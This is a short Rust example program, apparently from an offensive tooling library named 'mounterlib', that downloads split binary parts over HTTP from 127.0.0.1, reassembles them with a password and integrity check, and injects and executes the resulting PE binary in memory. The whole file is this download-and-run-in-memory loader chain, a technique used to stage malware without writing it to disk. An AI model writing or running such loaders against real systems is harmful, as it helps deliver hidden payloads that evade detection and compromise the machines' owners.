//! Download, reconstruct, and execute split binaries in memory

use mounterlib::{
    download::http::download_all_as_map, 
    reconstruct::rebuild_from_parts, 
    execution::local_pe::inject_and_execute};

const VERBOSE:bool = true;

fn main() {

    // Download urls
    let urls = [
        "http://127.0.0.1/hello.part000".to_string(),
        "http://127.0.0.1/hello.part001".to_string()
    ];

    println!("[+] Downloading parts...");
    let parts = download_all_as_map(&urls, 30, "Mozilla/5.0", false)
        .expect("Failed to download parts");
    println!("[+] Downloaded {} parts", parts.len());
    println!("[+] Reconstructing binary...");
    
        let binary = rebuild_from_parts(
            parts,
            Some("m3str3"), // Password
            true,           // Integrity check
            VERBOSE         // Verbose
        ).expect("Failed to reconstruct binary");
        
    println!("[+] Reconstructed binary: {} bytes", binary.len());
    println!("[+] Executing binary...");

    let _ = inject_and_execute(&binary, &[], false)
        .expect("Failed to execute binary");
    // The binary usually ends the process, so this part is unreachable
    
    unreachable!();
}


